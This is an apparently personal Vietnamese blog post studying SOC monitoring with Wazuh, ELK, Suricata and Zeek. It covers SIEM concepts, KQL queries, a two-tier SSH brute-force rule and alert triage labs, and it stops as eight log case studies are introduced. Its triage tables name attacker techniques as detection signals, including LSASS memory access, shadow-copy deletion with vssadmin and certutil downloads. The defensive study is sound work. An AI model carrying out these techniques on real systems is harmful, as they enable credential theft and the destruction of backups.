---
title: Tuần 3 — SIEM & Monitoring (ELK/Wazuh · Suricata · Zeek)
date: 2026-08-31 10:00:00 +0700
categories: [siem]
tags: [siem, edr, xdr, elk, wazuh, suricata, zeek, kql, mitre-attck, soc, threat-hunting]
---

Sau 2 tuần lót nền network + system, tuần 3 mình nhảy thẳng vào mảng lõi của công việc SOC: **SIEM & Monitoring**. Nội dung xoay quanh bộ ba quen thuộc **ELK/Wazuh** (SIEM), **Suricata** (IDS/IPS mạng) và **Zeek** (network telemetry) — từ lý thuyết kiến trúc, cách viết rule/query, cho tới phần mình thích nhất: ngồi soi tay từng alert thật để phân loại True Positive / False Positive. Bài này dài vì phần thực hành có 8 case log thật mình đã bóc tách kỹ, xin phép note lại đầy đủ vì đây đúng là kiểu tư duy mình muốn nhớ lâu dài.

## 1. SIEM — Khái niệm và vai trò

**SIEM (Security Information and Event Management)** là hệ thống thu thập, phân tích và quản lý dữ liệu bảo mật từ nhiều nguồn khác nhau trong doanh nghiệp, giúp giám sát toàn diện và phản ứng nhanh với các mối đe dọa. SIEM thực chất là sự tích hợp của 2 công nghệ:

- **SIM (Security Information Management)** — lưu trữ và phân tích dữ liệu bảo mật theo thời gian dài.
- **SEM (Security Event Management)** — phân tích sự kiện theo thời gian thực để phát hiện tấn công.

**Nguồn thu thập dữ liệu:**

- Thiết bị mạng: firewall, router, switch.
- Endpoint: máy chủ, PC, IoT.
- Ứng dụng & database: log nghiệp vụ, log hệ quản trị CSDL.
- Công cụ bảo mật khác: IDS/IPS, antivirus, VPN.

Sau khi thu thập, dữ liệu được **chuẩn hóa** để đảm bảo định dạng nhất quán, lưu trong big data storage kèm nén/tối ưu. Phân tích dựa trên 3 hướng chính: **Pattern Matching** (so khớp mẫu tấn công đã biết), **Behavioral Analysis** (phát hiện hành vi bất thường so với lịch sử) và **Machine Learning** (dự đoán mối đe dọa từ xu hướng dữ liệu).

**Chức năng cơ bản của SIEM**: thu thập & tổng hợp dữ liệu → phân tích & phát hiện mối đe dọa → tạo cảnh báo & ưu tiên xử lý → lưu trữ & tạo báo cáo → tự động hóa phản ứng. Công cụ tiêu biểu: Splunk, IBM QRadar, ArcSight, Microsoft Sentinel...

### SIEM vs EDR

**EDR (Endpoint Detection & Response)** tập trung phát hiện hành vi bất thường **trên endpoint** và phản ứng nhanh. Khác biệt cốt lõi: EDR theo dõi **chuỗi sự kiện** trên nhiều máy để phát hiện lateral movement, trong khi AV truyền thống chỉ xử lý từng file độc lập.

| Tiêu chí | SIEM | EDR |
|---|---|---|
| Trọng tâm | Tầm nhìn vĩ mô — toàn cảnh an ninh tổ chức | Tầm nhìn vi mô — chuyên sâu bảo vệ endpoint |
| Tính năng cốt lõi | Thu thập/chuẩn hóa log đa nguồn, tương quan sự kiện, lưu trữ dài hạn, dashboard cho SOC | Giám sát hành vi liên tục theo thời gian thực, phản hồi/ngăn chặn tự động tại thiết bị |
| Ứng phó | Tạo cảnh báo, mở phiếu, thường cần can thiệp thủ công hoặc tích hợp SOAR | Phản ứng tức thì trong vài giây: cách ly file, chấm dứt tiến trình, cô lập thiết bị |
| Use case | Xương sống cho SOC, tuân thủ (ISO 27001, PCI-DSS, HIPAA) | Chống ransomware, zero-day, APT — đặc biệt cho remote work |

Một số giải pháp EDR: CrowdStrike Falcon Insight, Wazuh, Velociraptor, OpenEDR, Sysmon...

### Họ hàng "DR": EDR/NDR/CDR/ITDR/XDR

- **EDR** — phát hiện & phản hồi tại **điểm cuối** (máy tính, máy chủ). Lớp nền tảng nhất.
- **NDR (Network Detection and Response)** — phát hiện & phản hồi trên **mạng**, chuyên phân tích traffic để tìm rà quét, đánh cắp dữ liệu, di chuyển ngang.
- **CDR (Cloud Detection and Response)** — bảo vệ workload, tài khoản, ứng dụng trên AWS/Azure/GCP.
- **ITDR (Identity Threat Detection and Response)** — bảo vệ hệ thống quản lý danh tính (Active Directory, Okta) khỏi đánh cắp quyền truy cập.
- **XDR (Extended Detection and Response)** — hợp nhất EDR + NDR + CDR + ITDR + SIEM về một bảng điều khiển, dùng AI/ML liên kết chuỗi tấn công trên toàn hạ tầng.

### Log normalization

**Log normalization** là quá trình chuyển đổi log từ nhiều nguồn với định dạng khác nhau (Windows Event Log dạng XML, syslog dạng text, firewall log dạng CSV...) về **một cấu trúc field thống nhất**. Ví dụ cùng là địa chỉ IP tấn công:

| Nguồn log | Tên field gốc |
|---|---|
| Cisco ASA firewall | `src` hoặc `outside_address` |
| Windows Event Log (ID 4624) | `Source Network Address` hoặc `IpAddress` |
| Linux Syslog / IPTables | `SRC=` |
| AWS CloudTrail | `sourceIPAddress` |
| Web Server Nginx | chuỗi IP nằm ở đầu dòng (positional, không có field name) |

Nếu không chuẩn hóa, muốn truy vấn "tìm mọi hoạt động của IP X trên toàn hệ thống" sẽ phải viết một câu query khổng lồ `WHERE src="X" OR SourceNetworkAddress="X" OR SRC="X" OR ...`. Quy trình chuẩn hóa gồm:

1. **Phân tích cú pháp (Parsing/Decoding)** — bóc tách raw text thành cặp `key: value` bằng regex, JSON parser, CSV/XML reader.
2. **Ánh xạ trường (Field Mapping)** — đưa tên field độc quyền của từng hãng về một tên chuẩn chung, ví dụ `src`, `SRC=`, `IpAddress`, `sourceIPAddress` → `source.ip`.
3. **Đồng bộ kiểu dữ liệu & định dạng** — timestamp về chuẩn ISO 8601 kèm UTC; port lưu số nguyên, IP lưu dạng object.
4. **Làm giàu dữ liệu (Enrichment)** — từ IP chuẩn hóa, tự động tra cứu GeoIP hoặc threat intel.

Ý nghĩa: cho phép **tương quan sự kiện (event correlation)** — SIEM chỉ liên kết được chuỗi tấn công nếu dữ liệu cùng ngữ cảnh — đồng thời tối ưu việc viết luật ("Write Once, Detect Everywhere") và tăng tốc tìm kiếm/điều tra.

## 2. Kiến trúc ELK Stack + Wazuh

- **Elasticsearch** — công cụ tìm kiếm & phân tích dữ liệu phân tán, xây trên Apache Lucene. Vai trò: cơ sở dữ liệu lưu trữ & đánh index log, cho phép tìm kiếm nhanh trên khối lượng lớn.
- **Logstash** — công cụ thu thập/xử lý/chuyển đổi log từ nhiều nguồn (log file, DB, message queue...). Vai trò: pipeline nhận log thô, parse/filter/transform (chính là bước normalization), rồi đẩy vào Elasticsearch.
- **Kibana** — giao diện đồ họa cho ELK Stack, dùng để truy vấn, trực quan hóa (dashboard, biểu đồ) và xem lại dữ liệu trong Elasticsearch.

**Cơ chế hoạt động ELK**: Logstash thu thập & chuẩn hóa dữ liệu → áp filter/rule tiền xử lý (parse, trích xuất, enrichment) → gửi đến Elasticsearch lưu trữ theo index → Kibana truy vấn/trực quan hóa.

**Kiến trúc pipeline Wazuh** (4 bước):

1. **Wazuh Agent** (cài trên endpoint) — "lính gác" liên tục theo dõi hệ thống, đọc log, ghi nhận sự kiện tại chỗ, gửi dòng dữ liệu mã hóa về Manager.
2. **Wazuh Manager** ("bộ não" trung tâm) — nhận log từ hàng loạt Agent, giải mã, làm sạch, so khớp với tập luật bảo mật, sinh alert khi phát hiện bất thường.
3. **Filebeat & Elasticsearch/Wazuh Indexer** — Filebeat đọc alert Manager tạo ra, đẩy sang Elasticsearch để lưu trữ & đánh index dài hạn.
4. **Kibana/Wazuh Dashboard** — lớp giao diện cuối, hiển thị alert dạng biểu đồ/dashboard thời gian thực.

> Điểm hay nhầm: trong **Elastic Stack** thuần, Filebeat là "shipper" đọc log file/app rồi chuyển tới Elasticsearch hoặc Logstash để xử lý thêm. Nhưng trong **pipeline Wazuh**, Filebeat là shipper nhẹ chạy ngay trên Wazuh Manager, chỉ có nhiệm vụ đọc log/alert do Manager tạo ra rồi chuyển tiếp sang Elasticsearch — đóng vai trò cầu nối giữa Manager và Elasticsearch, không đọc log thô từ endpoint.

## 3. KQL — Kibana Query Language

KQL là ngôn ngữ truy vấn dạng text đơn giản dùng trong Kibana để **lọc dữ liệu** — chỉ có chức năng lọc, không dùng để tổng hợp/biến đổi/sắp xếp, khác với Lucene về mặt tính năng. KQL cho phép kết hợp tìm kiếm văn bản tự do với tìm theo trường cụ thể:

| Loại truy vấn | Ví dụ |
|---|---|
| Cụm từ chính xác | `http.response.body.content.text:"quick brown fox"` |
| Nhiều giá trị | `http.response.status_code:400 401 404` |
| Boolean | `response:200 or extension:php` |
| Khoảng giá trị | `account_number >= 100 and items_sold <= 200` |
| Wildcard | `machine.os:win*` |

**Các cách dùng cơ bản:**

- **Kiểm tra field tồn tại**: `http.request.method: *`
- **Khớp giá trị cụ thể**: `http.request.method: GET`. Nếu không nêu tên field, KQL tìm trên tất cả field.
- Field kiểu **keyword/số/ngày/boolean** phải khớp chính xác; field kiểu **text** được Elasticsearch phân tích nên thứ tự từ không quan trọng, trừ khi đặt trong ngoặc kép để khớp đúng thứ tự.
- Ký tự đặc biệt cần escape bằng `\`: `\():<>"*`

**Range query**: dùng toán tử so sánh `http.response.bytes > 10000 and http.response.bytes <= 20000`, áp dụng được cho chuỗi, IP, thời gian (`@timestamp < now-2w`). Lưu ý: với field multi-value, mỗi điều kiện được đánh giá độc lập trên toàn mảng — có thể ra kết quả khác Query DSL.

**Wildcard/phủ định/kết hợp**: wildcard chỉ hỗ trợ khớp 0 hoặc nhiều ký tự (`status_code: 4*`), wildcard ở **đầu chuỗi bị chặn mặc định** vì lý do hiệu năng. Phủ định dùng `NOT`. Kết hợp dùng `AND`/`OR`, có thể dùng ngoặc đơn: `http.request.method: (GET OR POST OR DELETE)`.

**Nested field**: với field lồng nhau cần cú pháp đặc biệt để đảm bảo điều kiện khớp trên cùng một phần tử mảng, ví dụ `user:{ first: "Alice" and last: "White" }`.

> Tip thực chiến: trong màn hình **Discover** của Kibana, cột "Available fields" bên trái liệt kê toàn bộ field đang có trong index — có thể gõ tìm nhanh hoặc click vào 1 event để xem toàn bộ field/giá trị, từ đó biết chính xác tên field cần dùng trong query thay vì đoán mò.

## 4. Alert Rule trong Wazuh

**Rules** chứa các điều kiện định nghĩa để phát hiện sự kiện/hành vi độc hại dựa trên dữ liệu đã trích xuất từ **Decoders**. Khi một sự kiện khớp rule, alert được tạo và hiển thị trên Wazuh Dashboard.

**Các thành phần quan trọng của Rule**:

- `rule id` — ID duy nhất định danh rule.
- `rule level` — mức độ nghiêm trọng (0–15).
- `if_group` — rule chỉ kích hoạt khi group này đã match trước đó.
- `field name` — field được trích xuất từ decoder, giá trị so khớp bằng regex.
- `group` — nhóm phân loại rule, dùng để tổ chức và lọc alert.

Một rule Wazuh thường định nghĩa: **match pattern** (nội dung log phải khớp), **frequency** (số lần lặp lại để kích hoạt) và **timeframe** (khoảng thời gian mà frequency phải xảy ra trong đó) — kết hợp `frequency` + `timeframe` chính là cách phát hiện **brute-force**, thay vì báo động với 1 lần thất bại đơn lẻ vốn là chuyện bình thường.

**Ví dụ rule 2 tầng phát hiện brute-force SSH:**

```xml
<!-- Rule cha: phát hiện 1 lần đăng nhập thất bại -->
<rule id="100100" level="5">
  <if_sid>5716</if_sid>
  <match>Failed password</match>
  <description>SSH: Đăng nhập thất bại.</description>
  <group>authentication_failed,</group>
</rule>

<!-- Rule con: phát hiện brute-force dựa vào rule cha -->
<rule id="100101" level="10" frequency="5" timeframe="60">
  <if_matched_sid>100100</if_matched_sid>
  <same_source_ip/>
  <description>SSH: Nhiều lần đăng nhập thất bại liên tiếp từ cùng 1 IP - Nghi ngờ brute-force.</description>
  <group>authentication_failures,</group>
  <mitre><id>T1110</id></mitre>
</rule>
```

- `if_matched_sid` — điều kiện gốc: log phải đã khớp rule 100100 trước đó.
- `frequency="5" timeframe="60"` — rule 100100 phải xảy ra tối thiểu 5 lần trong cửa sổ 60 giây, dàn trải ra ngoài 60s thì không tính.
- `same_source_ip` — bắt buộc 5 lần thất bại phải đến từ **cùng một IP** — nếu thiếu dòng này, rule sẽ đếm chung tất cả IP, dễ gây false positive.
- `level="10"` — mức cảnh báo cao hơn hẳn rule cha (level 5), vì đây là dấu hiệu tấn công thật sự.

**Luồng khi log đổ về**: sshd ghi log `Failed password` → rule 100100 khớp, tăng bộ đếm cho IP đó, cảnh báo mức 5 → nếu trong 60 giây tiếp theo cùng IP tạo thêm log khớp đủ 5 lần, rule 100101 kích hoạt → cảnh báo mức 10 "nghi ngờ brute-force". Nếu 5 lần thất bại rải ra ngoài khung 60s, rule con **không** kích hoạt, chỉ có 5 cảnh báo level-5 riêng lẻ.

### Rule Level & Severity trong Wazuh

Rule level (0–15) không phải thước đo TP/FP tuyệt đối nhưng là điểm khởi đầu tốt để đánh giá độ tin cậy:

| Nhóm | Rule level | Ý nghĩa thực tế |
|---|---|---|
| Critical | 15 trở lên | Tấn công nghiêm trọng, gần như chắc chắn không phải false positive |
| High | 12–14 | Dấu hiệu tấn công rõ ràng, thường xác nhận qua correlation hoặc khớp mẫu tấn công phổ biến |
| Medium | 7–11 | Bắt đầu có khả năng liên quan bảo mật: sự kiện lần đầu xuất hiện, đăng nhập sai nhiều lần, cảnh báo integrity — cần theo dõi |
| Low | 0–6 | Log thông thường: thông báo hệ thống, đăng nhập thành công, gõ sai mật khẩu đơn lẻ |

### TP/FP/TN/FN

| Khái niệm | Định nghĩa | Ví dụ |
|---|---|---|
| True Positive (TP) | Alert bắn ra đúng là hoạt động độc hại thật sự | Rule brute-force kích hoạt vì có kẻ tấn công thật dò mật khẩu SSH, 5 lần thất bại trong 60s |
| False Positive (FP) | Alert bắn ra nhưng thực chất là hành vi hợp lệ | Script backup tự động đăng nhập bằng service account nhiều lần → bị rule brute-force nhận nhầm |
| True Negative (TN) | Không có alert, và đúng là không có gì độc hại xảy ra | — |
| False Negative (FN) | Không có alert, nhưng thực chất có tấn công xảy ra mà hệ thống bỏ sót | — |

**5 câu hỏi triage khi một alert bắn ra**: (1) Nguồn gốc hành vi — user hợp lệ, service account, hay IP/tài khoản lạ? (2) Ngữ cảnh thời gian — giờ hành chính hay nửa đêm/cuối tuần? (3) Baseline hành vi — có khớp pattern lịch sử của user/hệ thống không? (4) Whitelist/known-good — nguồn đã được xác nhận an toàn chưa? (5) Mức độ leo thang — sau alert ban đầu có dấu hiệu tiếp theo củng cố nghi ngờ không (ví dụ sau brute-force có login thành công bất thường)?

**Hậu quả khi nhầm lẫn**: coi **TP là FP** (bỏ sót tấn công thật) là hậu quả nghiêm trọng nhất — kẻ tấn công có thời gian tiếp tục hoạt động, thiệt hại thường chỉ phát hiện sau khi đã xảy ra hậu quả. Ngược lại coi **FP là TP quá nhiều** gây "**alert fatigue**" — analyst mệt mỏi, xử lý qua loa, dẫn đến nguy cơ một alert thật sự nằm lẫn trong hàng loạt FP dễ bị bỏ qua, vô tình biến thành False Negative.

## 5. Suricata — IDS/IPS Network

Suricata là hệ thống phân tích lưu lượng mạng & phát hiện đe dọa mã nguồn mở, có thể triển khai như **NIDS** (phát hiện xâm nhập), **NIPS** (ngăn chặn xâm nhập) và nền tảng **NSM** (giám sát an ninh mạng), phát triển bởi Open Information Security Foundation (OISF).

| Tiêu chí | IDS | IPS |
|---|---|---|
| Vị trí | Giám sát thụ động (Passive/Out-of-band) | Chủ động, inline trên đường truyền |
| Hành động | Phát hiện & sinh cảnh báo, không can thiệp trực tiếp | Có thể chặn/từ chối traffic (drop, reject) |
| Tác động đến mạng | Không ảnh hưởng, IDS chết mạng vẫn hoạt động bình thường | Có thể tăng độ trễ; IPS chết mà không có bypass thì mạng bị ngắt |
| Rủi ro báo động giả | Chỉ gây nhiễu thông tin cho analyst | Nguy hiểm — có thể tự động chặn nhầm user hợp lệ |
| Ví dụ | Zeek, Wazuh (HIDS), Snort/Suricata ở chế độ IDS | Cisco Firepower, Palo Alto, Snort/Suricata ở chế độ Inline/IPS |

**Cơ chế kỹ thuật**: ở chế độ IDS, Suricata chỉ sao chép & phân tích traffic đi qua mà không tác động trực tiếp lên gói tin, nên luật dạng `alert` chỉ tạo cảnh báo. Ở chế độ IPS, traffic được firewall chuyển vào hàng đợi **NFQUEUE**, Suricata đọc/xử lý từng gói trong hàng đợi — nếu khớp luật `drop`, gói tin bị loại bỏ trước khi tới ứng dụng đích. Thứ tự ưu tiên xử lý luật: **Pass > Drop > Reject > Alert**.

> Đáng chú ý: dù có khai báo luật `drop`, Suricata cũng không thể chặn thực sự nếu không được đặt inline thông qua NFQUEUE — để luật drop phát huy tác dụng, Suricata bắt buộc phải chạy ở chế độ IPS.

**Pipeline xử lý** (tuần tự): **Packet Acquisition** (libpcap, PF_RING, AF_PACKET, Netmap, DPDK) → **Decode** (Ethernet, IPv4/IPv6, TCP/UDP/ICMP) → **Flow Engine** (theo dõi kết nối dựa trên 5-tuple: src IP, dst IP, src port, dst port, protocol) → **Stream Reassembly** (tái tạo nội dung dữ liệu gốc từ các gói cùng kết nối TCP) → **Protocol Detection** (Deep Packet Inspection — nhận diện giao thức dựa trên nội dung thực tế, không chỉ dựa số cổng như nhiều IDS khác) → **Detection Engine** (so khớp signature, phân tích payload, kiểm tra điều kiện rule).

**Hạn chế của signature-based detection**: chỉ phát hiện được mẫu tấn công **đã biết trước** (có trong tập luật), khó phát hiện zero-day hoặc biến thể mới nếu signature chưa được cập nhật — đây là lý do Suricata cần liên tục `suricata-update` để lấy bộ luật ET Open mới nhất. Ngoài ra NIDS nói chung không thể phân tích dữ liệu đã mã hóa (SSL/SSH/IPSec), và có độ trễ giữa thời điểm bị tấn công với thời điểm báo động.

**Suricata thấy gì / không thấy gì so với HIDS (Wazuh):**

| | Suricata (Network) | Endpoint log (HIDS/Wazuh) |
|---|---|---|
| Thấy | Traffic HTTP/DNS/TLS metadata, payload chưa mã hóa, file truyền qua mạng, hành vi giữa các host | Tiến trình chạy trên máy, file bị sửa đổi, log hệ thống, dữ liệu đã giải mã |
| Không thấy | Traffic đã mã hóa (nội dung), việc tấn công có thành công thật hay không | Traffic giữa các host khác trên mạng, hành vi quét mạng/port scan |

## 6. Zeek — Network Telemetry

Nếu Suricata trả lời câu hỏi *"có ai đang tấn công không?"* bằng cách so khớp mẫu đã biết, thì Zeek trả lời câu hỏi *"điều gì đã thực sự xảy ra trên mạng?"* bằng cách ghi lại **toàn bộ ngữ cảnh giao tiếp** — kể cả khi lúc ghi log, không ai biết đó có phải điều đáng ngờ hay không.

| Tiêu chí | Suricata | Zeek |
|---|---|---|
| Triết lý | Alert-based — báo động khi khớp signature | Telemetry/visibility — ghi lại toàn bộ metadata mọi kết nối/giao thức |
| Điều kiện ghi log | Chỉ sinh cảnh báo khi traffic khớp rule | Ghi nhận mọi kết nối, không cần "biết đó là tấn công" trước |
| Mục đích | Phát hiện & cảnh báo ngay dấu hiệu đã biết | Tạo dữ liệu đầy đủ, có cấu trúc để threat hunting sau này |
| Output | Alert khi match rule + log tùy chọn | Structured log toàn diện, không phụ thuộc việc có "khớp" gì hay không |

Sự khác biệt này khiến **Zeek phù hợp cho retro-hunting** (truy vấn ngược lại dữ liệu quá khứ khi có threat intel mới), trong khi **Suricata phù hợp cho real-time detection**.

**Các log Zeek tạo ra:**

| Log | Nội dung |
|---|---|
| `conn.log` | Metadata mọi kết nối mạng: IP nguồn/đích, port, giao thức, thời lượng, số byte truyền |
| `dns.log` | Chi tiết mọi truy vấn DNS: domain, loại record, response — hữu ích phát hiện DGA hoặc DNS tunneling |
| `http.log` | Chi tiết request/response HTTP: URI, User-Agent, method, status code — tái dựng hành vi duyệt web mà không cần đọc raw packet |
| `ssl.log` | Thông tin handshake TLS/SSL: certificate, SNI, cipher suite — không đọc được nội dung mã hoá nhưng vẫn thấy metadata quan trọng, đặc biệt SNI cho biết domain đích |

Mỗi kết nối được gắn một `uid` duy nhất, cho phép liên kết các log khác nhau lại (ví dụ một entry `conn.log` nối với `http.log` và `ssl.log` cùng uid để dựng lại toàn bộ bức tranh của một phiên giao tiếp).

**Zeek phát hiện được gì mà Suricata khó thấy?** Vì Zeek ghi lại toàn bộ traffic dưới dạng structured log, SOC có thể truy vấn ngược lại để tìm pattern bất thường về **hành vi theo thời gian**, thay vì chỉ dựa vào một gói tin đơn lẻ khớp mẫu tấn công:

1. **Beaconing/C2 communication** — một host kết nối HTTPS đến cùng một IP đều đặn mỗi 5 phút. Từng kết nối riêng lẻ hoàn toàn hợp lệ, nhưng nhìn theo chuỗi thời gian trong `conn.log` sẽ thấy tính định kỳ bất thường — điều Suricata không phát hiện được vì nó chỉ xét từng gói/luồng tại thời điểm xảy ra.
2. **Data exfiltration** — khối lượng dữ liệu truyền ra ngoài bất thường lớn trong thời gian ngắn. Đây là bất thường về **volume/behavior**, không phải payload khớp signature — trường `orig_bytes`/`resp_bytes` trong `conn.log` cho phép phát hiện qua phân tích thống kê.

**Kết luận vai trò bổ sung**: các SOC hiện đại thường kết hợp cả hai — Suricata xử lý phát hiện tức thời với mối đe dọa đã biết (real-time alert), còn Zeek cung cấp lớp visibility sâu và dữ liệu lịch sử để threat hunter truy vấn, phát hiện mẫu hành vi bất thường mà không signature nào định nghĩa trước được.

---

## Thực hành

### Lab 3.1 — Cài đặt Wazuh

Tải và chạy installation assistant (cần quyền root/sudo), cờ `-a` nghĩa là cài **all-in-one** (indexer + server + dashboard trên cùng 1 máy):

```bash
curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh && sudo bash ./wazuh-install.sh -a
```

Khuyến nghị tài nguyên theo số agent (theo trang chủ Wazuh):

| Số agent | CPU | RAM | Ổ đĩa |
|---|---|---|---|
| 1–25 | 4 vCPU | 8 GiB | 50 GB |
| 25–50 | 8 vCPU | 8 GiB | 100 GB |
| 50–100 | 8 vCPU | 8 GiB | 200 GB |

Sau khi cài xong, script in ra thông tin đăng nhập (`https://<WAZUH_DASHBOARD_IP_ADDRESS>`, user `admin`). Trình duyệt sẽ cảnh báo chứng chỉ không tin cậy — bình thường vì mặc định dùng self-signed cert. Nếu quên mật khẩu, toàn bộ mật khẩu (indexer, API...) nằm trong `wazuh-passwords.txt` bên trong `wazuh-install-files.tar`:

```bash
sudo tar -O -xvf wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt
```

**Cài Agent**: vào Endpoints → Deploy new agent → chọn HĐH tương ứng → nhập địa chỉ Wazuh Server → đặt tên Agent → chạy lệnh deploy bằng quyền Admin/Sudo. Kiểm tra lại trên Manager bằng:

```bash
sudo /var/ossec/bin/manage_agents -l
```

File cấu hình Agent trên Windows nằm ở `C:\Program Files (x86)\ossec-agent\ossec.conf`.

**Các menu chính của Wazuh Dashboard** (tóm tắt):

| Nhóm | Các mục |
|---|---|
| Explore | Discover (bảng log/alert thô), Dashboards, Visualize, Reporting, Alerting, Anomaly Detection, Maps, Notifications |
| Endpoint Security | Configuration Assessment (SCA — quét theo CIS Benchmark), Malware Detection (rootcheck/YARA/VirusTotal), File Integrity Monitoring (FIM) |
| Threat Intelligence | Threat Hunting, Vulnerability Detection (đối chiếu CVE), MITRE ATT&CK mapping |
| Security operations | Bộ báo cáo theo khung tuân thủ: IT Hygiene, PCI DSS, GDPR, HIPAA, NIST 800-53, TSC |
| Cloud security | Docker, AWS, Google Cloud, GitHub, Office 365, Microsoft Graph API |
| Server management | Rules, Decoders, CDB Lists, Ruleset Test, Status, Cluster |

**Bộ field cơ bản nên chọn khi mới bắt đầu:**

| Field | Ý nghĩa |
|---|---|
| `timestamp` | Thời điểm alert xảy ra |
| `agent.name` / `agent.ip` | Tên máy / IP máy phát sinh alert |
| `rule.level` | Mức độ nghiêm trọng (0–15+) |
| `rule.description` | Mô tả alert bằng tiếng Anh, dễ hiểu nhất |
| `rule.id` | Mã số rule (dùng tra cứu/tùy biến) |
| `rule.groups` | Nhóm rule (vd: `authentication_failed`, `sca`, `syscheck`) |

### Lab 3.2 — Viết 5 KQL Query

Thực hành viết query trên màn hình Discover với dữ liệu log Windows/Sysmon thật:

1. **Tìm event đăng nhập thất bại (Event 4625)**: `data.win.system.eventID:4625`
2. **Event đăng nhập thất bại có severity cao**: kết hợp `data.win.system.eventID:4625 and rule.level >= 10`
3. **PowerShell được thực thi hoặc là parent process**: `data.win.eventdata.parentProcessName:"powershell.exe"` (hoặc field tương đương ở chiều ngược lại)
4. **Network logon (LogonType 3) không phải từ SYSTEM**: `data.win.eventdata.logonType:3 and not data.win.eventdata.targetUserName:"SYSTEM"`
5. **Event tạo process mới (Event 4688)**: `data.win.system.eventID:4688`

Mấu chốt của lab này không nằm ở cú pháp (đơn giản), mà ở việc **biết chính xác tên field** — cách nhanh nhất vẫn là click vào một event mẫu trong Discover, xem toàn bộ field/giá trị dạng bảng rồi copy đúng tên field thay vì đoán.

### Lab 3.3 — Tạo Alert Rule

Chọn rule id gốc của sự kiện đăng nhập SSH fail (`sshd: authentication failed`, sid có sẵn trong bộ rule mặc định Wazuh). Truy cập file custom rule trên Manager:

```bash
sudo nano /var/ossec/etc/rules/local_rules.xml
```

Viết rule brute-force dựa trên rule gốc (frequency = 5 lần / timeframe = 60 giây), y hệt cấu trúc 2 tầng đã trình bày ở phần lý thuyết mục 4 — điểm mấu chốt vẫn là bắt buộc `<same_source_ip/>` để tránh đếm gộp nhiều IP khác nhau. Restart Manager để áp dụng rule mới:

```bash
sudo systemctl restart wazuh-manager
```

Sau đó dùng Atomic Red Team để mô phỏng tấn công (T1110 brute-force, T1105 LOLBin, ransomware indicator...) và kiểm chứng bộ rule custom bằng các query KQL kiểu:

```text
rule.id >= 100000 and rule.id <= 100230        # toàn bộ alert do custom rule sinh ra
rule.id >= 100000 and rule.level >= 12         # chỉ alert mức nghiêm trọng cao
rule.id >= 100100 and rule.id <= 100125        # toàn bộ hoạt động recon phát hiện được
rule.id:100105 and data.win.eventdata.commandLine:*   # xác nhận bắt được Nmap kèm lệnh thực thi
rule.id >= 100200 and rule.id <= 100229        # toàn bộ dấu hiệu ransomware
```

Bài học rút ra sau khi chạy Atomic Red Team: **bộ rule custom không bao giờ bắt hết 100% log đã sinh ra** — đây là lý do vì sao tuning rule là công việc liên tục chứ không phải làm một lần.

### Lab 3.4 — Phân loại FP/TP

Đây là phần mình dành nhiều thời gian nhất tuần này. Phân loại TP/FP không phải "nhìn alert rồi đoán" mà là một **quy trình có thể lặp lại, giải thích được cho người khác**. Quy trình triage 5 bước: đọc mô tả/level → xác định nguồn → đối chiếu thời gian → xem field chi tiết → đối chiếu chuỗi sự kiện xung quanh — kết thúc bằng 1 trong **4 nhãn** thay vì chỉ TP/FP: thêm **Benign TP** (rule đúng nhưng vô hại theo bối cảnh) và **Escalate** (chưa đủ dữ liệu, cần điều tra thêm).

**6 trục dùng để phân loại trong Wazuh:**

- `rule.level` — mức độ tin cậy của chính rule (level 12+ thường xác suất TP cao; level 5–9 thường bắt qua command đơn lẻ, dễ FP hơn).
- `rule.groups` — loại hành vi (giúp áp đúng bộ câu hỏi kiểm tra tương ứng).
- `agent.name` / **vai trò của máy** — yếu tố quan trọng nhất nhưng dễ bị bỏ qua nhất. Cùng 1 alert PowerShell Bypass, ý nghĩa khác hẳn nhau nếu chạy trên máy IT Admin (bình thường) so với máy kế toán/lễ tân (rất đáng ngờ).
- **Thời gian** — trong giờ hành chính trùng lịch task đã biết thì nghiêng FP; ngoài giờ/cuối tuần thì nghiêng TP.
- **Field chi tiết** (`commandLine`, `originalFileName`, `targetFilename`, `destinationIp`...) — nơi tìm bằng chứng cụ thể thay vì chỉ dựa mô tả rule.
- **Đối chiếu chéo** với MITRE ATT&CK tab, Vulnerability Detection, FIM để xem alert có nằm trong một chuỗi kỹ thuật liên quan khác không.

**Hành vi dễ FP vs hiếm khi FP:**

| Dễ FP | Vì sao |
|---|---|
| PowerShell `-ExecutionPolicy Bypass` | Nhiều tool quản trị hợp pháp (Chocolatey, deployment script, GPO logon) đều dùng flag này |
| `whoami`, `systeminfo`, `tasklist` | Lệnh IT helpdesk dùng thường xuyên khi troubleshoot |
| Certutil tải file | Một số công cụ quản trị nội bộ dùng certutil như LOLBin hợp lệ |
| Kết nối RDP/WinRM port | Admin/support từ xa hợp lệ |

| Hiếm khi FP | Vì sao |
|---|---|
| Truy cập trực tiếp `lsass.exe` (Sysmon Event 10) | Rất ít phần mềm hợp pháp cần đọc bộ nhớ LSASS |
| Xoá Shadow Copy (`vssadmin delete shadows`) | Không có lý do vận hành bình thường nào cần xoá toàn bộ shadow copy |
| File đuôi `.locked`/`.encrypted`/ransom note xuất hiện hàng loạt | Không trùng bất kỳ hành vi hệ thống hợp lệ nào |
| `OriginalFileName` không khớp tên file thực thi | Không có lý do hợp lệ để giả tên file hệ thống (masquerading) |
| `CreateRemoteThread` vào tiến trình khác (Sysmon Event 8) | Rất hiếm hành vi hợp lệ tiêm thread vào process khác |

**Bài học chung quan trọng nhất**: TP/FP là khái niệm rõ ràng nhất với alert **hành vi** (behavior-based: IDS, correlation rule, anomaly). Với alert **trạng thái** (SCA, Vulnerability, FIM tĩnh) thì câu hỏi đúng hơn là "có đáng ưu tiên xử lý không" chứ không hẳn TP/FP truyền thống. Và một điều mình nhận ra xuyên suốt các case bên dưới: **True Positive không đồng nghĩa với malware** — TP chỉ nghĩa là detection phản ánh đúng activity mà rule muốn phát hiện; còn hành vi đó có phải mã độc hay không lại là một câu hỏi khác, cần endpoint telemetry để trả lời.

#### 8 case thực chiến — tóm tắt quá trình điều tra

Các sample xem tại : https://github.com/Baodeptraii/baodeptraii.github.io/tree/main/assets/sample 

Dưới đây là phần mình thấy giá trị nhất: 8 sample log thật (Wazuh/Sysmon, Suricata, Zeek, Router syslog), mỗi case mình đi đúng quy trình 5 bước ở trên rồi tự chốt nhãn — không tin ngay MITRE mapping mà Wazuh tự gán, luôn hỏi lại "telemetry gốc có thực sự chứng minh điều đó không".

